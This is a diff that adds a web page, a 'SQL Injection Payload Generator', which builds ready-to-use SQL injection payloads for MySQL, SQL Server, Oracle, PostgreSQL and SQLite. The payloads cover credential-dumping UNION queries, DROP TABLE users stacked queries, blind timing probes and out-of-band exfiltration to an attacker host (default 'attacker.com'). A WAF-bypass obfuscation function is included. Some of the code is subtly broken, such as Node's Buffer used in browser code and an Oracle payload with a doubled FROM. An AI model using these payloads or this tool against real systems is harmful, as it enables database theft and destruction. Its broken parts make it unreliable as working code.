@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLi Payload Generator | VulnXplorer</title>
+    <style>
+        :root {
+            --bg-color: #f5f5f5;
+            --text-color: #333;
+            --section-bg: white;
+            --border-color: #ddd;
+            --primary-color: #3498db;
+            --primary-hover: #2980b9;
+            --secondary-color: #27ae60;
+            --secondary-hover: #219653;
+            --error-color: #e74c3c;
+            --header-color: #2c3e50;
+            --disclaimer-bg: #ffecec;
+            --example-bg: #f9f9f9;
+        }
+
+        .dark-mode {
+            --bg-color: #1a1a1a;
+            --text-color: #e0e0e0;
+            --section-bg: #2d2d2d;
+            --border-color: #444;
+            --primary-color: #3a7ca5;
+            --primary-hover: #2f648a;
+            --secondary-color: #2e8b57;
+            --secondary-hover: #277a4a;
+            --error-color: #c0392b;
+            --header-color: #7fadb9;
+            --disclaimer-bg: #3a2525;
+            --example-bg: #383838;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: var(--text-color);
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: var(--bg-color);
+            transition: background-color 0.3s, color 0.3s;
+        }
+        
+        h1, h2 {
+            color: var(--header-color);
+        }
+        
+        h1 {
+            border-bottom: 2px solid var(--primary-color);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .disclaimer {
+            background-color: var(--disclaimer-bg);
+            border-left: 4px solid var(--error-color);
+            padding: 15px;
+            margin-bottom: 30px;
+            font-size: 0.9em;
+        }
+        
+        .disclaimer strong {
+            color: var(--error-color);
+        }
+        
+        .section {
+            background-color: var(--section-bg);
+            border-radius: 5px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            transition: background-color 0.3s;
+        }
+        
+        .section h2 {
+            margin-top: 0;
+            color: var(--primary-color);
+        }
+        
+        select, input, textarea, button {
+            padding: 8px 12px;
+            margin: 5px 0;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-family: inherit;
+            font-size: 0.95em;
+            background-color: var(--section-bg);
+            color: var(--text-color);
+            transition: background-color 0.3s, border-color 0.3s, color 0.3s;
+        }
+        
+        select {
+            width: 100%;
+            max-width: 300px;
+        }
+        
+        button {
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        
+        button:hover {
+            background-color: var(--primary-hover);
+        }
+        
+        .advanced-options {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px dashed var(--border-color);
+        }
+        
+        .result-area {
+            width: 100%;
+            min-height: 150px;
+            margin-top: 15px;
+            font-family: monospace;
+        }
+        
+        .copy-btn {
+            background-color: var(--secondary-color);
+            margin-top: 10px;
+        }
+        
+        .copy-btn:hover {
+            background-color: var(--secondary-hover);
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .payload-example {
+            background-color: var(--example-bg);
+            padding: 10px;
+            border-left: 3px solid var(--primary-color);
+            margin: 10px 0;
+            font-family: monospace;
+            font-size: 0.9em;
+            transition: background-color 0.3s;
+        }
+
+        .theme-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background-color: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            z-index: 100;
+        }
+
+        .theme-toggle:hover {
+            background-color: var(--primary-hover);
+        }
+    </style>
+</head>
+<body>
+    <button class="theme-toggle" id="themeToggle">🌓</button>
+    
+    <h1>SQL Injection Payload Generator</h1>
+    
+    <div class="disclaimer">
+        <strong>Ethical Use Disclaimer:</strong> This tool is for <strong>educational purposes and authorized security research only</strong>. Unauthorized SQL injection attacks on computer systems are illegal. Always obtain proper authorization before conducting any security testing.
+    </div>
+    
+    <div class="section">
+        <h2>1. Database Type</h2>
+        <select id="dbType">
+            <option value="mysql">MySQL</option>
+            <option value="mssql">Microsoft SQL Server</option>
+            <option value="oracle">Oracle</option>
+            <option value="postgresql">PostgreSQL</option>
+            <option value="sqlite">SQLite</option>
+        </select>
+    </div>
+    
+    <div class="section">
+        <h2>2. Injection Type</h2>
+        <select id="injectionType">
+            <option value="error_based">Error-Based</option>
+            <option value="union_based">Union-Based</option>
+            <option value="boolean_based">Boolean-Based (Blind)</option>
+            <option value="time_based">Time-Based (Blind)</option>
+            <option value="stacked">Stacked Queries</option>
+            <option value="out_of_band">Out-of-Band</option>
+        </select>
+        
+        <div id="unionOptions" class="hidden advanced-options">
+            <h3>Union-Based Options</h3>
+            <input type="number" id="unionColumns" min="1" max="50" value="3" placeholder="Number of columns">
+            <input type="text" id="unionTable" placeholder="Target table name (optional)">
+            <input type="text" id="unionColumn" placeholder="Target column name (optional)">
+        </div>
+        
+        <div id="booleanOptions" class="hidden advanced-options">
+            <h3>Boolean-Based Options</h3>
+            <input type="text" id="booleanCondition" placeholder="Condition (e.g., 1=1)" value="1=1">
+        </div>
+        
+        <div id="timeOptions" class="hidden advanced-options">
+            <h3>Time-Based Options</h3>
+            <input type="number" id="delaySeconds" min="1" max="30" value="5" placeholder="Delay in seconds">
+        </div>
+        
+        <div id="oobOptions" class="hidden advanced-options">
+            <h3>Out-of-Band Options</h3>
+            <input type="text" id="oobServer" placeholder="Your server address (e.g., attacker.com)">
+        </div>
+        
+        <div class="advanced-options">
+            <button id="toggleAdvanced">Show Advanced Options</button>
+            <div id="advancedOptions" class="hidden">
+                <h3>Advanced Options</h3>
+                <label>
+                    <input type="checkbox" id="encodePayload" checked> URL-encode payload
+                </label>
+                <br>
+                <label>
+                    <input type="checkbox" id="commentPayload" checked> Append comment
+                </label>
+                <br>
+                <label>
+                    <input type="checkbox" id="bypassWAF"> Include WAF bypass techniques
+                </label>
+            </div>
+        </div>
+    </div>
+    
+    <div class="section">
+        <h2>3. Generate Payload</h2>
+        <button id="generateBtn">Generate SQLi Payload</button>
+        
+        <div class="payload-example">
+            <strong>Example:</strong> <span id="payloadExample">Select an injection type to see an example</span>
+        </div>
+    </div>
+    
+    <div class="section">
+        <h2>4. Generated Payload</h2>
+        <textarea id="payloadOutput" class="result-area" readonly></textarea>
+        <button id="copyBtn" class="copy-btn">Copy to Clipboard</button>
+    </div>
+    
+    <script>
+        // Toggle dark mode
+        document.getElementById('themeToggle').addEventListener('click', function() {
+            document.body.classList.toggle('dark-mode');
+            const isDark = document.body.classList.contains('dark-mode');
+            localStorage.setItem('darkMode', isDark);
+            this.textContent = isDark ? '🌞' : '🌓';
+        });
+
+        // Check for saved theme preference
+        if (localStorage.getItem('darkMode') === 'true') {
+            document.body.classList.add('dark-mode');
+            document.getElementById('themeToggle').textContent = '🌞';
+        }
+
+        // Toggle advanced options
+        document.getElementById('toggleAdvanced').addEventListener('click', function() {
+            const advancedOptions = document.getElementById('advancedOptions');
+            advancedOptions.classList.toggle('hidden');
+            this.textContent = advancedOptions.classList.contains('hidden') ? 
+                'Show Advanced Options' : 'Hide Advanced Options';
+        });
+        
+        // Show/hide options based on injection type
+        document.getElementById('injectionType').addEventListener('change', function() {
+            const injectionType = this.value;
+            
+            // Hide all option divs
+            document.getElementById('unionOptions').classList.add('hidden');
+            document.getElementById('booleanOptions').classList.add('hidden');
+            document.getElementById('timeOptions').classList.add('hidden');
+            document.getElementById('oobOptions').classList.add('hidden');
+            
+            // Show relevant option div
+            if (injectionType === 'union_based') {
+                document.getElementById('unionOptions').classList.remove('hidden');
+            } else if (injectionType === 'boolean_based') {
+                document.getElementById('booleanOptions').classList.remove('hidden');
+            } else if (injectionType === 'time_based') {
+                document.getElementById('timeOptions').classList.remove('hidden');
+            } else if (injectionType === 'out_of_band') {
+                document.getElementById('oobOptions').classList.remove('hidden');
+            }
+            
+            updatePayloadExample();
+        });
+        
+        // Update example when any input changes
+        const inputs = document.querySelectorAll('select, input');
+        inputs.forEach(input => {
+            input.addEventListener('change', updatePayloadExample);
+            input.addEventListener('input', updatePayloadExample);
+        });
+        
+        // Update payload example
+        function updatePayloadExample() {
+            const dbType = document.getElementById('dbType').value;
+            const injectionType = document.getElementById('injectionType').value;
+            const exampleElement = document.getElementById('payloadExample');
+            
+            let example = '';
+            
+            if (injectionType === 'error_based') {
+                example = getErrorBasedExample(dbType);
+            } else if (injectionType === 'union_based') {
+                const columns = document.getElementById('unionColumns').value;
+                const table = document.getElementById('unionTable').value || 'users';
+                const column = document.getElementById('unionColumn').value || 'username,password';
+                example = getUnionBasedExample(dbType, columns, table, column);
+            } else if (injectionType === 'boolean_based') {
+                const condition = document.getElementById('booleanCondition').value || '1=1';
+                example = getBooleanBasedExample(dbType, condition);
+            } else if (injectionType === 'time_based') {
+                const delay = document.getElementById('delaySeconds').value || '5';
+                example = getTimeBasedExample(dbType, delay);
+            } else if (injectionType === 'stacked') {
+                example = getStackedExample(dbType);
+            } else if (injectionType === 'out_of_band') {
+                const server = document.getElementById('oobServer').value || 'attacker.com';
+                example = getOutOfBandExample(dbType, server);
+            }
+            
+            exampleElement.textContent = example;
+        }
+        
+        // Error-based examples
+        function getErrorBasedExample(dbType) {
+            const examples = {
+                'mysql': `' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x3a,(SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- `,
+                'mssql': `' AND 1=CONVERT(int,(SELECT table_name FROM information_schema.tables))--`,
+                'oracle': `' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT table_name FROM user_tables WHERE ROWNUM=1))--`,
+                'postgresql': `' AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)--`,
+                'sqlite': `' AND 1=load_extension(1,(SELECT sql FROM sqlite_master WHERE type='table'))--`
+            };
+            return examples[dbType] || examples['mysql'];
+        }
+        
+        // Union-based examples
+        function getUnionBasedExample(dbType, columns, table, column) {
+            const nulls = Array(parseInt(columns)).fill('null').join(',');
+            const examples = {
+                'mysql': `' UNION SELECT ${nulls},${column} FROM ${table}-- `,
+                'mssql': `' UNION SELECT ${nulls},${column} FROM ${table}--`,
+                'oracle': `' UNION SELECT ${nulls},${column} FROM ${table} FROM dual--`,
+                'postgresql': `' UNION SELECT ${nulls},${column} FROM ${table}--`,
+                'sqlite': `' UNION SELECT ${nulls},${column} FROM ${table}--`
+            };
+            return examples[dbType] || examples['mysql'];
+        }
+        
+        // Boolean-based examples
+        function getBooleanBasedExample(dbType, condition) {
+            const examples = {
+                'mysql': `' AND ${condition}-- `,
+                'mssql': `' AND ${condition}--`,
+                'oracle': `' AND ${condition}--`,
+                'postgresql': `' AND ${condition}--`,
+                'sqlite': `' AND ${condition}--`
+            };
+            return examples[dbType] || examples['mysql'];
+        }
+        
+        // Time-based examples
+        function getTimeBasedExample(dbType, delay) {
+            const examples = {
+                'mysql': `' AND (SELECT * FROM (SELECT(SLEEP(${delay})))a)-- `,
+                'mssql': `' WAITFOR DELAY '0:0:${delay}'--`,
+                'oracle': `' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS' AND 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',${delay}))=1--`,
+                'postgresql': `' AND (SELECT pg_sleep(${delay}))--`,
+                'sqlite': `' AND (SELECT randomblob(${delay*1000000}))--`
+            };
+            return examples[dbType] || examples['mysql'];
+        }
+        
+        // Stacked queries examples
+        function getStackedExample(dbType) {
+            const examples = {
+                'mysql': `'; DROP TABLE users-- `,
+                'mssql': `'; DROP TABLE users--`,
+                'oracle': `'; DROP TABLE users--`,
+                'postgresql': `'; DROP TABLE users--`,
+                'sqlite': `'; DROP TABLE users--`
+            };
+            return examples[dbType] || examples['mysql'];
+        }
+        
+        // Out-of-band examples
+        function getOutOfBandExample(dbType, server) {
+            const examples = {
+                'mysql': `' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.${server}\\\\share\\\\')))-- `,
+                'mssql': `'; EXEC master..xp_dirtree '\\\\${server}\\share'--`,
+                'oracle': `' AND (SELECT UTL_HTTP.REQUEST('http://${server}/'||(SELECT banner FROM v$version WHERE rownum=1)) FROM dual)=1--`,
+                'postgresql': `'; COPY (SELECT '') TO PROGRAM 'nslookup ${server}'--`,
+                'sqlite': `' AND (SELECT load_extension('\\\\${server}\\share\\malicious.dll'))--`
+            };
+            return examples[dbType] || examples['mysql'];
+        }
+        
+        // Generate payload
+        document.getElementById('generateBtn').addEventListener('click', function() {
+            const dbType = document.getElementById('dbType').value;
+            const injectionType = document.getElementById('injectionType').value;
+            const encodePayload = document.getElementById('encodePayload').checked;
+            const commentPayload = document.getElementById('commentPayload').checked;
+            const bypassWAF = document.getElementById('bypassWAF').checked;
+            
+            let payload = document.getElementById('payloadExample').textContent;
+            
+            // Apply WAF bypass techniques if selected
+            if (bypassWAF) {
+                payload = applyWAFBypass(payload, dbType);
+            }
+            
+            // URL encode if selected
+            if (encodePayload) {
+                payload = encodeURIComponent(payload);
+            }
+            
+            document.getElementById('payloadOutput').value = payload;
+        });
+        
+        // Apply WAF bypass techniques
+        function applyWAFBypass(payload, dbType) {
+            // Apply various bypass techniques
+            let bypassed = payload;
+            
+            // Case variation
+            bypassed = caseVariation(bypassed);
+            
+            // Comment obfuscation
+            if (dbType === 'mysql') {
+                bypassed = bypassed.replace(/ /g, '/**/');
+                bypassed = bypassed.replace(/'/g, '%df%27');
+            } else if (dbType === 'mssql') {
+                bypassed = bypassed.replace(/ /g, '%20');
+                bypassed = bypassed.replace(/'/g, '%27');
+            }
+            
+            // Hex encoding
+            if (bypassed.includes('SELECT')) {
+                bypassed = bypassed.replace(/SELECT/gi, '0x'+Buffer.from('SELECT').toString('hex'));
+            }
+            
+            // Double encoding
+            bypassed = encodeURIComponent(encodeURIComponent(bypassed));
+            
+            return bypassed;
+        }
+        
+        // Case variation
+        function caseVariation(str) {
+            let result = '';
+            for (let i = 0; i < str.length; i++) {
+                const char = str[i];
+                if (Math.random() > 0.5) {
+                    result += char.toUpperCase();
+                } else {
+                    result += char.toLowerCase();
+                }
+            }
+            return result;
+        }
+        
+        // Copy to clipboard
+        document.getElementById('copyBtn').addEventListener('click', function() {
+            const output = document.getElementById('payloadOutput');
+            output.select();
+            document.execCommand('copy');
+            
+            const originalText = this.textContent;
+            this.textContent = 'Copied!';
+            setTimeout(() => {
+                this.textContent = originalText;
+            }, 2000);
+        });
+        
+        // Initialize example
+        updatePayloadExample();
+    </script>
+</body>
+</html>
